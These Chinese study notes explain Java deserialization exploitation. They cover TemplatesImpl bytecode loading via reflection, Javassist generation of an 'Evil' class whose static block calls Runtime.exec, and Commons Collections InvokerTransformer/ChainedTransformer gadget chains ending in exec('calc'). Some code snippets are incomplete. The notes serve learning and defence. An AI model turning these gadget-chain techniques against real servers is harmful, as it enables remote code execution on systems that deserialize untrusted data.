    28. TemplatesImpl
    29. 是什么：是 Java 内部用来表示"编译好的 XSLT 样式表"的类，当一个 XSLT 文件被加载后，Java 会解析 XSLT 文件（文本格式）编译成内部表示（Templates 对象，实际是 TemplatesImpl 实例）用这个 TemplatesImpl 对象反复执行转换
    30. 核心价值：会加载给定的字节数组，通过内部TransletClassLoader调用definrClass方法，触发JVM（连接+初始化），从而执行恶意代码 本质上：TemplatesImpl是一个合法的、不会在黑名单中的动态类加载入口
    31. 关键点：TemplatesImpl 的核心逻辑（即加载并实例化恶意字节码的那个方法）是通过 getTransletInstance() 被触发的 
      private Translet getTransletInstance() throws TransformerConfigurationException {
   // 1. 检查 _name 不为空
   if (_name == null) return null;

   // 2. 加载字节码（_bytecodes）
   if (_class == null) defineTransletClasses();

   // 3. 实例化，触发恶意类的构造代码
   AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
   // ...
}
      这个方法内部检查了三个关键的私有变量： 1. _name：必须不为 null。 2. _bytecodes：存放着恶意类的字节码。 3. _tfactory：在部分 JDK 版本中必须存在，否则会报错 直接 new 出来的对象，这些私有字段都是空的，调用其 newTransformer() 方法并不能达到执行恶意代码的目的。因此，利用的核心在于通过反射修改这些 private 字段的值，而不是直接使用 public 方法初始化。
    32. 为什么攻击者喜欢它：因为 TemplatesImpl 有一个隐藏功能：它不仅能加载 XSLT 文件，还能直接接收 Java 字节码，并把字节码当成"XSLT 转换逻辑"来执行。 
      // 正常用法：传入 XSLT 文件内容
TemplatesImpl templates = new TemplatesImpl();
templates.setSource(xsltSource);  // XSLT 文本

// 恶意用法：直接传入 Java 字节码
TemplatesImpl templates = new TemplatesImpl();
setField(templates, "_bytecodes", new byte[][]{evilJavaClassBytecode});
setField(templates, "_name", "anything");
templates.newTransformer();  // 触发加载字节码
    33. TemplatesImpl具体干了什么 正常流程 
      // TemplatesImpl内部大致结构
public class TemplatesImpl {
   // 这个字段存的是字节码数组（多个.class文件的内容）
   private byte[][] _bytecodes;  // 每个byte[]就是一个.class文件

   // 当调用newTransformer()时

      // 1. 把_bytecodes里的字节码加载成Class对象

      // 2. 实例化这个类
      Object obj = clazz.newInstance();

      // 3. 执行

   }
}

      // 1. 先写一个恶意类（源码）
public class Evil {
   static {
      // 静态代码块，类加载时自动执行
      Runtime.getRuntime().exec("calc.exe");
   }
}

    34. 对比使用序列化数据流 序列化数据流只能恢复已有的类。 假如目标服务器没有 Evil 这个类： 你发送Evil对象的序列化数据 → 反序列化时找不到Evil类 → ClassNotFoundException 而字节码方案： 你把Evil.class的内容（字节码）放进 _bytecodes 字段 TemplatesImpl会动态定义这个类（相当于临时创建了Evil类） 然后实例化执行 这就是为什么TemplatesImpl是反序列化漏洞的"神器"——它让攻击者能在目标服务器上凭空创建一个新类并执行。
    35. 一句话：XSLT 是一套"XML 转换规则"，TemplatesImpl 是 Java 内部用来表示这套规则的编译后对象。攻击者发现可以直接往 TemplatesImpl 里塞 Java 字节码，让它执行任意代码，于是它成了反序列化漏洞的经典载体。
    36. TemplatesImpl如何实现动态加载类
      1. TemplatesImpl 内部有一个私有的类加载器 TransletClassLoader，它重写了 defineClass 方法，可以直接从字节数组加载类。 
        class TemplatesImpl {
   private byte[][] _bytecodes;  // 存放恶意字节码

   private TransletClassLoader classLoader = new TransletClassLoader();

   synchronized void newTransformer() {
      // 关键：这里触发动态加载
      Class<?> clazz = classLoader.defineClass(_bytecodes[0]);
      clazz.newInstance();  // 实例化，执行恶意代码
   }
}
        把恶意类的字节码塞进 _bytecodes 字段 确保 _name 不为 null（内部检查） 确保 _tfactory 不为 null（内部用到） 然后调用 newTransformer()，恶意代码就会执行。

    41. 逐行详解
      1. ClassPool pool = ClassPool.getDefault(); 作用：创建一个"类池"，相当于 Javassist 的工作区。 ClassPool.getDefault() 会扫描当前 JVM 的 classpath，把能找到的所有类都记录下来，这样后续当你写 "java.lang.String" 时，它知道这个类在哪里。
      2. pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); 作用：把 AbstractTranslet 这个类的路径添加到类池的搜索路径中。 为什么要添加：因为我们新生成的恶意类要继承 AbstractTranslet，Javassist 需要知道这个父类在哪里。不加这行，后面 pool.get(AbstractTranslet.class.getName()) 会报 NotFoundException。 ClassClassPath 是什么：告诉 Javassist 去当前类的类加载器里找这个类
      3. CtClass cc = pool.makeClass("Evil"); 作用：创建一个新的空类，类名暂时叫 "Evil"。 CtClass = Compile-time Class，是 Javassist 里代表一个类的对象 这个类目前是空的，没有字段、没有方法
      4. String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";，cc.makeClassInitializer().insertBefore(cmd); 作用：在类的静态初始化块（static { ... }）中插入恶意代码。 makeClassInitializer() 创建一个静态块（如果不存在的话） insertBefore() 把代码插入到静态块的最前面 生成的 Java 代码等价于： 
        public class Evil {
   static {
      java.lang.Runtime.getRuntime().exec("calc.exe");
   }
}
        为什么用静态块？ 静态块在类加载时自动执行，不需要手动调用任何方法 当 TemplatesImpl 加载这个类时，静态块里的代码就会运行
      5. cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); 作用：设置父类为 AbstractTranslet pool.get("类全名") 从类池中获取 AbstractTranslet 的 CtClass 对象 setSuperclass() 让 Evil 继承这个父类 生成的 Java 代码等价于： 
        public class Evil extends AbstractTranslet {
   // ...
}
      6. String rename = "Evil" + System.nanoTime();，cc.setName(rename); 作用：避免类名重复 如果多次运行 POC，每次都叫 "Evil"，JVM 可能会缓存导致问题 加一个纳秒级时间戳，确保每次类名不同 生成的类名类似：Evil12345678901234
      7. byte[] bytes = cc.toBytecode(); 作用：把 CtClass 对象转换成真正的字节码（.class 文件的内容）。 这一步就相当于 Javassist 帮忙完成了"编译"，输出的是一个 byte[]，可以直接被 ClassLoader.defineClass() 使用。 等价于：javac Evil.java 后读出来的 Evil.class 文件内容
      8. byte[][] targetByteCodes = new byte[][]{bytes}; 作用：把字节码包成一个二维数组。 TemplatesImpl._bytecodes 是 byte[][] 类型，支持存储多个类的字节码（XSLT 模板可能包含多个辅助类）。我们只用一个类，所以包成 new byte[][]{bytes} 即可

    序列化和反序列化¶

    1. 什么是序列化 序列化（serialization）是将内存中的“对象”（一组数据和行为）转换成一种可以持久化存储（如保存到硬盘） 或可以在网络传输的格式（如字节流，json，XML） 反序列化是与序列化相反的过程：从这种格式中重构出原来的对象 
      java对象->-[序列化]->字节流-[网络传输/持久化存储]->-字节流->-[反序列化]->java对象
      一句话记住核心： 对象是“活的”，活在特定JVM的内存中，有地址、有引用关系、有运行时状态。序列化就是给对象“拍张照片”，把它的“内在信息”提取出来，变成可以在任何时间、任何地点“复活”它的数据。【这也解释了为什么反序列化如此危险——因为“复活”过程中，攻击者可以篡改照片里的内容，让复活的对象执行恶意行为。】
    2. 为什么要序列化
    3. 对象在内存中的本质：在java中，一个对象存在于JVM的堆内存中，包含三部分：
      1. 对象头（Header）：包含GC状态，锁信息，类元数据指针（指向哪个类）
      2. 实例数据（Instance Data）：字段的值（int、引用地址）
      3. 填充对齐（Padding）：为了内存对齐 关键：对象中存储的引用是内存地址，该地址只在当前JVM进程中有意义
    4. 对象为什么不能做字节流做的事
      1. 进程间通信：RMI（Java远程方法调用）、RPC（远程过程调用）
        1. 假设进程A想要把一个User对象发送给进程B会遇到的问题
          1. 内存地址无效，内部指针断裂：进程A中的 user 对象地址 0x1234，在进程B的地址空间中可能对应完全不同的数据。User 对象内部引用了 name 字符串对象（地址 0x5678），这个地址在进程B中毫无意义
          2. JVM内部结构差异：不同JVM版本、不同厂商（Oracle vs OpenJDK）、不同GC实现，对象的内存布局可能完全不同
          3. 进程A和B的 User 类版本可能不同（新增字段、删除字段、修改类型）
        2. 示例 错误 
          // 进程A - 试图直接发送内存中的对象
User user = new User("Alice", 25);
sendToProcessB(user);  // 如果这样做，只会发送指针值 0x1234
          正确 
          // 进程A
byte[] data = serialize(user);  // 变成: [0xAC, 0xED, 0x00, 0x05, ... "Alice", 25 ...]
sendBytesToProcessB(data);

// 进程B
byte[] received = receiveBytes();
User user = (User) deserialize(received);  // 重建：新的内存地址，新创建的String对象
        3. 序列化的本质：把内存中的关系网转化成扁平的、自描述的数据流，丢弃地址信息，保留逻辑信息
      2. 分布式缓存：如 Redis、Memcached 存储Java对象
        1. 为什么对象不能直接存入缓存：Redis 是一个独立于JVM之外的进程（用C语言编写）。它与JVM没有任何内存共享。
          1. Redis不认识JVM对象：Redis只能存储字符串（二进制安全的）、列表、哈希、集合等基本数据结构
          2. 内存布局不同：JVM对象有对象头、Mark Word、Klass指针，C语言的结构体完全不同
          3. 无法重建类定义：Redis不知道 User 类有哪些字段、各字段类型是什么
        2. 示例： 错误 
          // 直接存储对象引用（完全无效）

// 或者更糟：试图存储内存地址
redis.set("user:123", String.valueOf(userObject.hashCode())); // 毫无意义       

          // 存：对象 → 序列化字节数组 → 作为字符串/二进制存入Redis
byte[] data = serialize(user);
redis.set("user:123".getBytes(), data);  // 存的是字节流

// 取：取出字节数组 → 反序列化 → 恢复对象
byte[] cached = redis.get("user:123".getBytes());

        3. 序列化后的字节流包含了完整的类元信息（类名、字段名、字段类型）。反序列化时，JVM根据类名找到本地class定义，按字段名逐个赋值
      3. 深度复制：通过序列化实现对象的深拷贝
        1. 【前置知识：深度复制（Deep Copy）是创建一个新对象，并递归复制原对象内部所有引用类型字段指向的对象，使得原对象和复制对象完全独立，互不影响。】
        2. 为什么对象不能直接完成深拷贝？很多人会用 clone() 方法，但 Object.clone() 只能完成浅复制
        3. 为什么序列化能完成深拷贝？ 序列化会递归遍历整个对象图（对象引用的对象，再引用的对象...） 反序列化时全新创建所有对象，所有引用都是新地址，与原对象完全独立
      4. Session持久化：Tomcat等容器将Session对象保存到文件或数据库【Tomcat 需要将用户的 Session 保存到硬盘（比如重启后恢复登录状态）】
        1. 为什么Session对象不能直接保存到文件？
          1. 内存地址无效：重启后JVM是全新的进程，原来的内存地址全部废弃
          2. 对象关系复杂：Session 中可能存了 User、ShoppingCart、List 等，形成对象图
          3. 静态字段不保存：类的静态变量属于Class对象，不属于实例，不应被持久化
          4. 资源对象不可序列化：Session 中可能包含 Connection（数据库连接）、FileInputStream 等，这些对象本身无法持久化

    Gadget Chain¶

    Gadget¶

    1. 是什么：受害者系统中已经存在的可以被攻击者利用的类或方法片段
    2. 存在的根本原因：可以执行命令的类基本上都不是可序列化
    3. 核心原理：readObject 本身没有危险代码，但它调用了某个方法，那个方法又调用了另一个方法...最终到达危险代码。
    4. 链式调用示例 
        // 类A：readObject 中调用了 put
  public class ClassA implements Serializable {
      private Map map;
      private Object key;
      private Object value;

      private void readObject(ObjectInputStream in) {
          in.defaultReadObject();
          map.put(key, value);  // ← 看起来无害
      }
  }

  // 类B：put 方法中调用了 transform
  public class ClassB implements Serializable {
      private Transformer transformer;

      public Object put(Object key, Object value) {
          // 如果 key 不存在，调用 transformer
          if (!containsKey(key)) {
              Object result = transformer.transform(key);
              put(key, result);
              return result;
          }
          return null;
      }
  }

  // 类C：transform 中执行反射
  public class ClassC implements Serializable {
      private String methodName;

      public Object transform(Object input) {
          Method m = input.getClass().getMethod(methodName);
          return m.invoke(input);
      }
  }

    4. 串联Gadget：串联多个Gadget【ChainedTransformer】

    5. InvokerTransformer（危险核心）
    6. 简单理解：InvokerTransformer 就是"反射调用代码的序列化版本"
    7. 为什么需要：因为攻击者写的反射调用代码不可序列化，需要通过InvokerTransformer将攻击者想要实现的反射调用代码转换为可序列化的对象。攻击者不能把反射代码直接发给受害者。他们必须把反射代码"翻译"成 InvokerTransformer 对象链，因为这些对象可以被序列化。受害者反序列化时，这些对象的 transform() 方法被自动调用，最终等价于执行了反射代码。
    8. 源码 
      // Commons Collections 3.2.1 中的真实源码
package org.apache.commons.collections.functors;

public class InvokerTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = -8653385846894047688L;

    // 存储的三个关键信息
    private final String iMethodName;      // 要调用的方法名
    private final Class[] iParamTypes;     // 方法的参数类型数组
    private final Object[] iArgs;          // 方法的参数值数组

    // 构造方法
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    // 🔥 核心方法：通过反射调用任意方法
    public Object transform(Object input) {
        if (input == null) {
            throw new IllegalArgumentException("Input object cannot be null");
        }
        try {
            // 1. 获取 input 对象的类
            Class<?> cls = input.getClass();

            // 2. 获取方法（支持私有方法？不，getMethod 只能拿 public）
            //    这就是为什么某些链需要 getDeclaredMethod 的问题
            Method method = cls.getMethod(iMethodName, iParamTypes);

            // 3. 调用方法
            return method.invoke(input, iArgs);

        } catch (Exception e) {
            throw new FunctorException("InvokerTransformer: " + e.getMessage());
        }
    }
}

    12. ChainedTransformer（串联器）
    13. 作用：把多个Transformer串联起来，让前一个的输出作为后一个的输入
    14. 源码简化版 
      public class ChainedTransformer implements Transformer {
    private final Transformer[] iTransformers;  // Transformer 数组

    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

    public Object transform(Object input) {
        Object result = input;
        // 依次调用每个 Transformer，前一个的输出是后一个的输入
        for (Transformer t : iTransformers) {
            result = t.transform(result);
        }
        return result;
    }
}

    使用方法¶
    1. ConstantTransformer 提供起点，InvokerTransformer 执行反射调用，ChainedTransformer 把它们串成链。三条配合，从 null 一路走到 calc.exe。这就是 CC 链的核心原理，也是所有反序列化 Gadget 链的模板。
    2. 简单示例 
         import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InvokerTransformer;

   public class transformerDemo {
       public static void main(String[] args) {
           // 构造 Transformer 链
           Transformer[] transformers = new Transformer[] {
               // 1. 返回 Runtime.class
               new ConstantTransformer(Runtime.class),

               // 2. 调用 getMethod("getRuntime")
               new InvokerTransformer(
                   "getMethod",
                   new Class[]{String.class, Class[].class},
                   new Object[]{"getRuntime", new Class[0]}
               ),

               // 3. 调用 invoke(null)
               new InvokerTransformer(
                   "invoke",
                   new Class[]{Object.class, Object[].class},

               new InvokerTransformer(
                   "exec",
                   new Class[]{String.class},
                   new Object[]{"calc"}
               )
           };

           // 串联起来
           ChainedTransformer chain = new ChainedTransformer(transformers);

       }

    3. 如果受害者代码中已经存在 transformer.transform(input) 这样的调用点（比如在某个类的 readObject 中）。攻击者通过构造并序列化 ChainedTransformer 对象，让受害者的反序列化过程把这个对象"复活"到 transformer 变量中。当受害者代码执行 transformer.transform(input) 时，实际执行的是攻击者预设的 ChainedTransformer.transform()，从而触发整个反射链，执行任意命令。攻击者写逻辑，受害者提供执行时机。
    4. 总结：攻击者需要的 Gadget 有三种情况：直接危险（极少见）、间接调用（最常见，如 CC1 链）、hashCode/toString 触发（如 URLDNS 链）。核心是找到受害者系统中已有的类，这些类的 readObject 或它调用的方法最终能链式到达 Runtime.exec()。InvokerTransformer 之所以是核心，就是因为它提供了"间接调用到任意方法"的能力。

    URLDNS链¶

    1. 是什么：URLDNS是一个无害的探测链，仅根据反序列化触发DNS查询，用于探测目标是否存在反序列化漏洞
    2. 特点
    3. 危害：无危害，仅触发DNS查询，不执行命令
    4. 依赖：JDK自带的类，无需第三方库
    5. 用途：用于探测目标是否存在反序列化漏洞
